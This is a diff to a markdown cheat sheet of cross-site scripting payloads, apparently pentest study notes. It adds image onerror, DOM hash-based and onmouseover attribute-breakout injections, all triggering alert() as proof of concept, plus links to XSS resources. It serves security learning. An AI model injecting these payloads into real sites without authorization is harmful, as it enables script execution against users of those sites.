@@ -32,15 +32,28 @@
 10- `</script><script>alert('XSS');</script>` | __escaping script tags to excute the payload__
 
 
-11- `';alert('xss');//`  | The apostrophe character is used to escape in PHP __'__
+11- `';alert('xss');//`  | The apostrophe character is used to escape in PHP htmlentities __'__
 
 
-12- 
+12- `' onerror=alert('xss');> ` &nbsp;  &nbsp; |  &nbsp; use this if the vulnerability in the image
+
+
+13- `#<script>alert(1)</script>` &nbsp;  &nbsp;  |  &nbsp;  __exploiting the DOM xss with hash.substring__
+
+14- `#javascript:alert(1)`  &nbsp;  &nbsp; |  &nbsp;  __exploiting the DOM xss with hash.substring__
+
+15- `" onmouseover="alert(1)` &nbsp;  &nbsp; |  &nbsp;
+
+16-
 
 ### Extra Resources:
 
 - [Convert Characters to ASCII Codes](https://www.browserling.com/tools/text-to-ascii)
 
 - [Complete List of XSS Payloads:](https://github.com/nairuzabulhul/RoadMap/blob/master/PTP/Web_Security/XSS_Payload_List.txt)
+
+- [ABC of XSS](https://quanyang.github.io/the-abcs-of-xss/)
+
+- [Infosec Notes](http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/)
 
 - 
